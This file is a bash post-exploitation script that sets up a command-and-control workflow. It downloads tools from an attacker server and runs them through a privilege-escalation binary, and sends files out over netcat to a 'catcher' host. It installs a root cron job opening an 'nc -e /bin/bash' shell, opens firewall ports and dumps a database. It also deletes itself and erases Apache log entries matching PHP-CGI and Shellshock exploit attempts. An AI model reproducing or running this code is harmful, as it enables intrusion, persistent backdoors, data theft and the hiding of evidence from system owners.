#!/bin/bash
# command & control server
URL="http://192.168.1.XXX/"
CATCHER=192.168.1.XXX
# time to quit netcat
I=1

#tools
PE_Raw=pe_source.c
PE=lspge
DUMP=dump.sh
SELF=exp.sh
POST=post.sh
CMD=cmnd.sh

# holding off on sending source 
all_tools=( $PE $DUMP $CMD $SELF )
# obscure dir with obscure names
DIR=/dev/shm/
HIDE=".tools"

# Move all operations into shm 
cd $DIR
if [ ! -d $HIDE ]; then
	# if dir doesn't exist
	mkdir $HIDE
fi

cd $HIDE

function get_all_tools_as_root {
	for tool in ${all_tools[@]}
	do
		if [ ! -f $tool ]; then
			echo "wget $URL$tool" | ./$PE
			echo "chmod +x $tool" | ./$PE
		fi
	done

	clean_tracks
}

function send_file_to_server {
	#  cat a file over
	for arg in "$*"
	do
		cat $arg | nc -q $I $CATCHER $CP
	done
	clean_tracks
}

function send_echo_to_server {
	echo $arg | nc -q $I $CATCHER $CP
	clean_tracks
}


function clean {
	for arg in "$*"
	do
		rm -rf $arg
	done
	clean_tracks
}

function clean_DIR {
	clean $HIDE
	clean_tracks
}

function bind_into_cron {
	# arg is the port #
	printf '*/5 * * * * \troot \tnc -k -lp $1 -e /bin/bash \n" >> /etc/crontab' | ./$PE
	clean_tracks
}


function open_says_me {
	echo '/sbin/iptables -A INPUT -p tcp -m tcp --dport $1 -j ACCEPT' | ./$PE
	clean_tracks
}

function get_whole_database_as_root {
	# leaves data in .post
	echo "./$DUMP" | ./$PE
	clean_tracks
}


function switch_myself_around {
	# get the priv_ex
	# redownload script as root
	# run as root
	cd $HIDE
	wget -O $PE $URL$PE
	chmod +x $PE
	echo "wget -O $POST $URL$SELF" | ./$PE
	echo "wget $URL$DUMP" | ./$PE
	echo "wget $URL$CMD"  | ./$PE
	echo "chmod +x $POST" | ./$PE
	echo "chmod +x $DUMP" | ./$PE
	echo "chmod +x $CMD"  | ./$PE
	echo "chown root:root $HIDE" | ./$PE
	echo "chown root:root $PE" | ./$PE
	echo "chown -hR root:root $DIR$HIDE" | ./$PE
	# install the bot to crontab
	echo "./cmnd.sh" | ./$PE
	clean_tracks
	kill_myself
}


function kill_myself {
	cd $DIR
	rm -- $0
}

function clean_tracks {
	printf "%s\n" 'g/\/cgi-bin\/php?-d+allow_url_include/d' w q | ed /var/log/apache2/access.log
	printf "%s\n" 'g/() { :; };/d' w q | ed /var/log/apache2/access.log
}

### main ###

# figure out what to do

case "$1" in 
	-g) get_all_tools_as_root
	    ;;
    	-G) get_database_as_root
	    ;;
	-K) kill_myself
	    ;;
	-B) open_says_me 8008		# open port
	    bind_into_cron 8008
		;;
	-c) clean_tracks
		;;
	 *) switch_myself_around
	    ;;
esac	

exit 0

